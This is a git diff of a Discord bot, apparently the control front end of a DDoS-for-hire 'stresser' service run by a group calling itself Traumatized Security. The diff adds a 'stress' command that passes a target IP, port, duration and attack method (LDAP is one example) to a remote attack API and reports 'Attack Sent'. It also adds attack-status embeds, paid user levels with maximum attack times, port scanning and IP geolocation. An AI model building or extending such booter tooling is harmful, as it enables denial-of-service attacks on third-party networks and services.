@@ -3,6 +3,7 @@ const fetch = require("node-fetch");
 const client = new Discord.Client();
 const config = require("./src/config.js");
 const crud = require("./src/crud.js");
+const extra = require("./src/extra.js");
 
 //Bot on ready.
 
@@ -44,14 +45,24 @@ client.on('message', async (message) => {
     if(message.content.startsWith(config.BotInfo.Prefix + "help")) { //FIRST COMMAND!
       // sendmsg("Help", "Help | Shows The List Of Commands\nMethods | Shows The List Of Methods\nCredits | Shows The Creators\n\n**Tools**\nGeo | Shows The Details Of An Ip Address\nPscan | Shows The Common Ports\n\n**Admin Commands**\nAddusr | Adds A User To The Database\nRemoveusr | Removes A User From The Database\nUpgradeusr | Upgrades A Users Plan")
       help();
+    } else if(message.content.startsWith(config.BotInfo.Prefix + "test")) {
+      bootembed("1.1.1.1", "80", "30", "LDAP", "Sent", "1/13/21-8:00pm");
+    } else if(message.content.startsWith(config.BotInfo.Prefix + "myinfo")) {
+      let get_info = crud.user(config.CurrentUser.Discord_id, "all");
+      let info = get_info.split(",");
+      sendmsg("My Info", "```User: " + info[0] + " | ID: " + info[1] + "\nLevel: " + info[2] + " | Maxtime: " + info[3] + " | Admin: " + info[4] + "```");
     } else if(message.content.startsWith(config.BotInfo.Prefix + "geo")) {
       ip = config.CurrentMSG.arg[1];
-      if(message.content.split(" ").length < 1) {
-        sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "geo <ip>");
+      if(message.content == config.BotInfo.Prefix + "geo") {
+         sendmsg("Error", "Missing arguments!\nUsage: geo <ip>\nExmaple: geo 5.5.5.5");
       } else {
-        fetch("https://scrapy.tech/tools/?action=geoip&q=" + ip).then(res => res.text()).then(body => {
-          sendmsg("Geo", body);
-        });
+        let get_geo = extra.geo(ip);
+        sleep(5000).then(() =>  {
+          sendmsg("Geo", get_geo);
+        }) 
+        // fetch("https://scrapy.tech/tools/?action=geoip&q=" + ip).then(res => res.text()).then(body => {
+        //   sendmsg("Geo", body);
+        // });
       }
     } else if(message.content.startsWith(config.BotInfo.Prefix + "pscan")) {
       ip = config.CurrentMSG.arg[1];
@@ -74,12 +85,17 @@ client.on('message', async (message) => {
     } else if(message.content.startsWith(config.BotInfo.Prefix + "credits")) {
       sendmsg("Credits", "**Traumatized Security Team**\n\n**draco Social Media**\nInstagram | bizivix\nDiscord | draco#3024\n**GDK Scrapy Social Media**\nInstagram | gdkscrapy\nDiscord | GDK Scrapy#9431\n**WhosGotFrost Social Media**\nInstagram | whosgotfrost\nDiscord | WhosGotFrost#8041\n**Lag oh ye Social Media**\nDiscord | Lag oh ye#0001")
     } else if(message.content.startsWith(config.BotInfo.Prefix + "stress")) {
-      ip = config.CurrentMSG.arg[1];
-      if(message.content.split(" ").length < 1) {
+      let ip = config.CurrentMSG.arg[1];
+      let port = config.CurrentMSG.arg[2];
+      let time = config.CurrentMSG.arg[3];
+      let method = config.CurrentMSG.arg[4];
+      if(message.content.split(" ").length < 4) {
         sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time>");
       } else {
-        fetch("https://scrapy.tech/tools/?action=pscan&q=" + ip).then(res => res.text()).then(body => {
-          pscan(body);
+        fetch("api" + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+          if(body.toLowerCase().includes("attack sent")) {
+            sendmsg("Attack Status", "Sent")
+          }
         });
       }
     } else if(message.content.startsWith(config.BotInfo.Prefix + "removeusr")) {
@@ -102,7 +118,7 @@ client.on('message', async (message) => {
         embed.setColor(16711680)
         embed.setTitle(config.BotInfo.Name + " | " + titlel)
         embed.setDescription(descriptionl)
-        embed.setFooter('Traumatized | Created & Developed By: Traumatized Security | Main Server: ttps://discord.gg/9CAqV29Mjd')
+        embed.setFooter('Traumatized | Created & Developed By: Traumatized Security | Main Server: ' + config.BotInfo.Server_Invite)
     message.channel.send(embed)
   }
 
@@ -125,10 +141,36 @@ client.on('message', async (message) => {
 	    	{ name: "About | Credits and contact info", value: config.BotInfo.Prefix + 'credits'},
 	    	{ name: '\u200B', value: '\u200B' },
 	    	{ name: 'Admin | List of admin commands', value: config.BotInfo.Prefix + 'admincp'})
-	    .setFooter(config.BotInfo.Name + ` | Created & Developed By: ` + config.Creator.Name + ` | Main Server: https://depatched.ga/join`,'');
+	    .setFooter(config.BotInfo.Name + ` | Created & Developed By: Traumatized Security | Main Server: ` + config.BotInfo.Server_Invite, 'https://scrapy.tech/image0.png');
 
         message.channel.send(exampleEmbed);
   }
+
+  function bootembed(ip, p, t, m, status, timestamp) {
+      const exampleEmbed = new Discord.MessageEmbed()
+	    .setColor('#0099ff')
+	    .setTitle(config.BotInfo.Name + " | Attack Status")
+	    .addFields(
+		    // { name: 'Regular field title', value: 'Some value here' },
+		    // { name: '\u200B', value: '\u200B' },
+	    	{ name: 'IP', value: ip, inline: true },
+	    	{ name: 'Port', value: p, inline: true },
+	    	{ name: 'Time', value: t, inline: true },
+	    	{ name: 'Method', value: m, inline: true },
+	    	{ name: 'Status', value: status, inline: true },
+	    	{ name: 'Timestamp', value: timestamp, inline: true },
+    	)
+    	.setImage('https://media1.giphy.com/media/11Ad7FqUiNMRAA/giphy.gif')
+    	.setTimestamp()
+    	.setFooter(config.BotInfo.Name + ` | Created & Developed By: Traumatized Security | Main Server: ` + config.BotInfo.Server_Invite, 'https://scrapy.tech/image0.png');
+
+    message.channel.send(exampleEmbed);
+  }
 });
+
+const sleep = (milliseconds) => {
+  return new Promise(resolve => setTimeout(resolve, milliseconds))
+}
+
 
 client.login(config.BotInfo.Token);
